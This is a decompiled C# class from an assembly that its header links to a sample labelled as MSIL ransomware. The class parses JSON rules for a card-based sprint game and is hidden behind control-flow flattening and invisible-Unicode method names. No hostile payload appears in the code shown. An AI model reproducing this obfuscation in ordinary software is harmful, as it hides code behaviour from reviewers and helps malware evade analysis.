// Decompiled with JetBrains decompiler
// Type: Cytotechnologist.Rules
// Assembly: StaticIndexRangePartitionForArr, Version=2.0.4.0, Culture=neutral, PublicKeyToken=null
// MVID: AF5A1990-133C-4640-B616-63D01D46DEA5
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.02-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-7c7116c6a0f1e06e4c252ea45668b85c1fdf3f35216097be1208e14be4066b36.exe

using SimpleJSON;
using System;
using System.Collections.Generic;
using System.Globalization;
using System.Runtime.InteropServices;

namespace Cytotechnologist
{
  public class Rules
  {
    public int SprintCount { get; private set; }

    public int MaxImpact { get; private set; }

    public Card[] Cards { get; private set; }

    public int InitialResources { get; private set; }

    public int NormalPlanningCount { get; private set; }

    public int NormalPlanningCost { get; private set; }

    public int OverPlanningCost { get; private set; }

    public int SprintsWonWithoutPlanning { get; private set; }

    public float[] RiskChances { get; private set; }

    public bool EconomicsAffectsAll { get; private set; }

    public int StayOnSprintMinDiff { get; private set; }

    public bool OnlyOneWinner { get; private set; }

    private Rules()
    {
    }

    public static Rules Deserialize(JSONNode json)
    {
label_1:
      int num1 = 747168038;
      Rules rules;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 1825308084)) % 4U)
        {
          case 0:
            goto label_1;
          case 1:
            num1 = (int) num2 * -1615128875 ^ 1546245690;
            continue;
          case 2:
            int asInt = json["max-impact"].AsInt;
            rules = new Rules()
            {
              SprintCount = json["sprints"].AsInt,
              MaxImpact = asInt,
              Cards = Rules.ParseDeck(json["deck"], asInt),
              InitialResources = json["initial-resources"].AsInt,
              NormalPlanningCount = json["normal-planning-count"].AsInt,
              NormalPlanningCost = json["normal-planning-cost"].AsInt,
              OverPlanningCost = json["over-planning-cost"].AsInt,
              SprintsWonWithoutPlanning = json["sprints-won-without-planning"].AsInt,
              RiskChances = Rules.ParseRiskChances(json["risk-chances"]),
              EconomicsAffectsAll = json["economics-affects-all"].AsBool,
              StayOnSprintMinDiff = json["stay-on-sprint-min-diff"].AsInt,
              OnlyOneWinner = json["only-one-winner"].AsBool
            };
            num1 = (int) num2 * 1725400061 ^ 1156728967;
            continue;
          default:
            goto label_5;
        }
      }
label_5:
      return rules;
    }

    private static float[] ParseRiskChances(JSONNode json)
    {
      float[] numArray = new float[json.Count];
      int aIndex = 0;
label_1:
      int num1 = -1158857993;
      float[] riskChances;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -102304344)) % 8U)
        {
          case 0:
            goto label_1;
          case 1:
            numArray[aIndex] = json[aIndex].AsFloat;
            num1 = -1160057018;
            continue;
          case 2:
            int num3;
            num1 = num3 = aIndex < numArray.Length ? -122501303 : (num3 = -793923173);
            continue;
          case 3:
            riskChances = numArray;
            num1 = (int) num2 * 1374777924 ^ 1027244352;
            continue;
          case 4:
            num1 = (int) num2 * 1681908604 ^ -1397193451;
            continue;
          case 6:
            ++aIndex;
            num1 = (int) num2 * 2034035623 ^ 331382464;
            continue;
          case 7:
            num1 = (int) num2 * -258455800 ^ 1245685370;
            continue;
          default:
            goto label_9;
        }
      }
label_9:
      return riskChances;
    }

    private static Card[] ParseDeck(JSONNode json, int maxImpact)
    {
label_1:
      int num1 = -46503046;
      int aIndex1;
      int num2;
      JSONNode jsonNode;
      int aIndex2;
      List<Card> cardList;
      Card[] array;
      int count;
      bool flag1;
      bool flag2;
      bool flag3;
      while (true)
      {
        uint num3;
        switch ((num3 = (uint) (num1 ^ -1303155997)) % 27U)
        {
          case 0:
            cardList.Add(new Card()
            {
              Impact = flag1 ? -(maxImpact - aIndex2) : maxImpact * 2 - aIndex2,
              Type = aIndex1
            });
            num1 = -1704248391;
            continue;
          case 1:
            flag2 = aIndex2 < maxImpact * 2;
            num1 = -285609753;
            continue;
          case 3:
            int num4 = !flag3 ? -1787586093 : (num4 = -253638863);
            num1 = num4 ^ (int) num3 * 1328554549;
            continue;
          case 4:
            num1 = -1232170434;
            continue;
          case 5:
            int num5;
            num1 = num5 = num2 >= jsonNode[aIndex2].AsInt ? -1882911991 : (num5 = -2078226233);
            continue;
          case 6:
            goto label_1;
          case 7:
            aIndex1 = 0;
            num1 = (int) num3 * 2016742447 ^ 1548107683;
            continue;
          case 8:
            aIndex2 = 0;
            num1 = (int) num3 * 26552103 ^ -669561823;
            continue;
          case 9:
            jsonNode = json[aIndex1];
            num1 = -1006641203;
            continue;
          case 10:
            flag1 = aIndex2 < maxImpact;
            num1 = (int) num3 * -690791702 ^ -1131986892;
            continue;
          case 11:
            num1 = (int) num3 * -5743337 ^ -78263256;
            continue;
          case 12:
            int num6 = !flag2 ? -840326283 : (num6 = -742739260);
            num1 = num6 ^ (int) num3 * -1914619298;
            continue;
          case 13:
            num1 = (int) num3 * 2143959706 ^ 1437733940;
            continue;
          case 14:
            cardList = new List<Card>();
            num1 = (int) num3 * 1404174416 ^ -657433591;
            continue;
          case 15:
            ++aIndex1;
            num1 = (int) num3 * 1950676328 ^ -863626547;
            continue;
          case 16:
            ++aIndex2;
            num1 = (int) num3 * 350776967 ^ -820630742;
            continue;
          case 17:
            count = json.Count;
            num1 = (int) num3 * 1789733543 ^ -1696606578;
            continue;
          case 18:
            num1 = (int) num3 * -2041962736 ^ 1056187672;
            continue;
          case 19:
            array = cardList.ToArray();
            num1 = (int) num3 * 149715255 ^ 166063555;
            continue;
          case 20:
            num2 = 0;
            num1 = -1013926753;
            continue;
          case 21:
            ++num2;
            num1 = (int) num3 * 40713885 ^ -596670056;
            continue;
          case 22:
            flag3 = aIndex1 < count;
            num1 = -2000111186;
            continue;
          case 23:
            num1 = (int) num3 * -615508062 ^ -1071592743;
            continue;
          case 24:
            num1 = (int) num3 * 508619526 ^ 907478992;
            continue;
          case 25:
            num1 = (int) num3 * -1928194855 ^ -626871584;
            continue;
          case 26:
            num1 = (int) num3 * 1553762939 ^ -1859146340;
            continue;
          default:
            goto label_28;
        }
      }
label_28:
      return array;
    }

    public override string ToString() => Rules.\u206A‎⁪‍‍‭‎⁭⁪‬⁯⁮⁯⁬‎‎⁭‍‬‫⁭‏‪‫⁮⁯‎⁭‏​‮​‎⁪‪⁪‪‪⁬⁫‮("sprints: {0},\nmax-impact:{1},\ndeck: \n{2},\n\ninitial-resources: {3},\n\nnormal-planning-count: {4},\nnormal-planning-cost: {5},\nover-planning-cost: {6},\nsprints-won-without-planning: {7},\n\nrisk-chances: {8},\n\neconomics-affects-all: {9},\nstay-on-sprint-min-diff: {10},\nonly-one-winner: {11}", new object[12]
    {
      (object) this.SprintCount,
      (object) this.MaxImpact,
      (object) this.CardsToString(),
      (object) this.InitialResources,
      (object) this.NormalPlanningCount,
      (object) this.NormalPlanningCost,
      (object) this.OverPlanningCost,
      (object) this.SprintsWonWithoutPlanning,
      (object) this.RiskChancesToString(),
      (object) this.EconomicsAffectsAll,
      (object) this.StayOnSprintMinDiff,
      (object) this.OnlyOneWinner
    });

    private string CardsToString()
    {
label_1:
      int num1 = 1303355305;
      Card[] cards;
      string str1;
      string str2;
      int num2;
      int index;
      Card card1;
      while (true)
      {
        uint num3;
        switch ((num3 = (uint) (num1 ^ 1776120690)) % 17U)
        {
          case 0:
            ++index;
            num1 = (int) num3 * 402645256 ^ 1134884766;
            continue;
          case 1:
            string str3 = str1;
            Card card2 = card1;
            string str4 = card2 != null ? Rules.\u202E‎‎‫⁫‎⁯⁭⁫‬⁭⁬⁪⁯⁮‮⁭​​⁬‬‪⁬⁭‌⁯⁭⁬⁯⁯⁬‪⁪‮‪⁮‫‍‫‪‮((object) card2) : (string) null;
            str1 = Rules.\u206B‮‫‏⁬​⁫‎‏‪⁬⁬⁯‏‌​‏‪‬⁪‍⁯⁯‍‭‪⁫‏⁯⁮‎⁫‏⁪⁪‭‍‭⁭⁮‮(str3, str4, " ");
            num1 = 782588718;
            continue;
          case 2:
            int num4 = num2 != card1.Type ? -591384451 : (num4 = -1993923691);
            num1 = num4 ^ (int) num3 * 860930637;
            continue;
          case 3:
            card1 = cards[index];
            num1 = 1075275316;
            continue;
          case 4:
            goto label_1;
          case 5:
            num1 = (int) num3 * -519641641 ^ -695588028;
            continue;
          case 6:
            num1 = (int) num3 * -1163806117 ^ -313939766;
            continue;
          case 7:
            num2 = card1.Type;
            num1 = (int) num3 * -186635736 ^ 141487833;
            continue;
          case 8:
            int num5;
            num1 = num5 = index >= cards.Length ? 806940959 : (num5 = 890127762);
            continue;
          case 10:
            str1 = "[\n\t";
            num2 = 0;
            num1 = (int) num3 * 1524276376 ^ 1521729259;
            continue;
          case 11:
            num1 = (int) num3 * -1942591216 ^ 1763417580;
            continue;
          case 12:
            cards = this.Cards;
            num1 = (int) num3 * -358038872 ^ 2109051578;
            continue;
          case 13:
            num1 = (int) num3 * -264881495 ^ -1352093506;
            continue;
          case 14:
            index = 0;
            num1 = (int) num3 * 1410316194 ^ -2036328770;
            continue;
          case 15:
            str2 = Rules.\u202E⁬⁯​‭‍⁭⁯‫⁪‏‪‭⁭⁮‌⁯⁯⁬‮⁬⁫‍​⁪⁭⁭‫‭‭⁯⁮⁮‏‎⁭⁯‫‌‮(str1, "\n]");
            num1 = (int) num3 * 509545631 ^ 25331547;
            continue;
          case 16:
            str1 = Rules.\u202E⁬⁯​‭‍⁭⁯‫⁪‏‪‭⁭⁮‌⁯⁯⁬‮⁬⁫‍​⁪⁭⁭‫‭‭⁯⁮⁮‏‎⁭⁯‫‌‮(str1, "\n\t");
            num1 = (int) num3 * 768293659 ^ -603082045;
            continue;
          default:
            goto label_18;
        }
      }
label_18:
      return str2;
    }

    private string RiskChancesToString()
    {
label_1:
      int num1 = 1622360371;
      int index;
      string str1;
      string str2;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 2080685207)) % 10U)
        {
          case 0:
            num1 = (int) num2 * 1754469631 ^ -1609853691;
            continue;
          case 1:
            index = 1;
            num1 = (int) num2 * -1473665610 ^ -1718823917;
            continue;
          case 3:
            str2 = Rules.\u202E⁬⁯​‭‍⁭⁯‫⁪‏‪‭⁭⁮‌⁯⁯⁬‮⁬⁫‍​⁪⁭⁭‫‭‭⁯⁮⁮‏‎⁭⁯‫‌‮(str1, " ]");
            num1 = (int) num2 * -1686347341 ^ -784844343;
            continue;
          case 4:
            goto label_1;
          case 5:
            str1 = Rules.\u206B‮‫‏⁬​⁫‎‏‪⁬⁬⁯‏‌​‏‪‬⁪‍⁯⁯‍‭‪⁫‏⁯⁮‎⁫‏⁪⁪‭‍‭⁭⁮‮(str1, ", ", this.RiskChances[index].ToString((IFormatProvider) Rules.\u202E⁪‭‏⁯‪⁮‭⁫⁫⁬⁫‮⁭‏‍‭⁫​‬‍‎⁬‬‍⁭‭​‫⁫‪⁫⁭⁪⁭‎⁯⁯‍⁪‮()));
            num1 = 956370592;
            continue;
          case 6:
            int num3;
            num1 = num3 = index < this.RiskChances.Length ? 1330667934 : (num3 = 1584424362);
            continue;
          case 7:
            ++index;
            num1 = (int) num2 * 2024174169 ^ -1595627312;
            continue;
          case 8:
            str1 = Rules.\u202E⁬⁯​‭‍⁭⁯‫⁪‏‪‭⁭⁮‌⁯⁯⁬‮⁬⁫‍​⁪⁭⁭‫‭‭⁯⁮⁮‏‎⁭⁯‫‌‮("[ ", this.RiskChances[0].ToString((IFormatProvider) Rules.\u202E⁪‭‏⁯‪⁮‭⁫⁫⁬⁫‮⁭‏‍‭⁫​‬‍‎⁬‬‍⁭‭​‫⁫‪⁫⁭⁪⁭‎⁯⁯‍⁪‮()));
            num1 = (int) num2 * -892918773 ^ -2085055808;
            continue;
          case 9:
            num1 = (int) num2 * 1514276679 ^ 1242550986;
            continue;
          default:
            goto label_11;
        }
      }
label_11:
      return str2;
    }

    static string \u206A‎⁪‍‍‭‎⁭⁪‬⁯⁮⁯⁬‎‎⁭‍‬‫⁭‏‪‫⁮⁯‎⁭‏​‮​‎⁪‪⁪‪‪⁬⁫‮([In] string obj0, [In] object[] obj1) => string.Format(obj0, obj1);

    static string \u202E⁬⁯​‭‍⁭⁯‫⁪‏‪‭⁭⁮‌⁯⁯⁬‮⁬⁫‍​⁪⁭⁭‫‭‭⁯⁮⁮‏‎⁭⁯‫‌‮([In] string obj0, [In] string obj1) => obj0 + obj1;

    static string \u202E‎‎‫⁫‎⁯⁭⁫‬⁭⁬⁪⁯⁮‮⁭​​⁬‬‪⁬⁭‌⁯⁭⁬⁯⁯⁬‪⁪‮‪⁮‫‍‫‪‮([In] object obj0) => obj0.ToString();

    static string \u206B‮‫‏⁬​⁫‎‏‪⁬⁬⁯‏‌​‏‪‬⁪‍⁯⁯‍‭‪⁫‏⁯⁮‎⁫‏⁪⁪‭‍‭⁭⁮‮(
      [In] string obj0,
      [In] string obj1,
      [In] string obj2)
    {
      return obj0 + obj1 + obj2;
    }

    static CultureInfo \u202E⁪‭‏⁯‪⁮‭⁫⁫⁬⁫‮⁭‏‍‭⁫​‬‍‎⁬‬‍⁭‭​‫⁫‪⁫⁭⁪⁭‎⁯⁯‍⁪‮() => CultureInfo.InvariantCulture;
  }
}
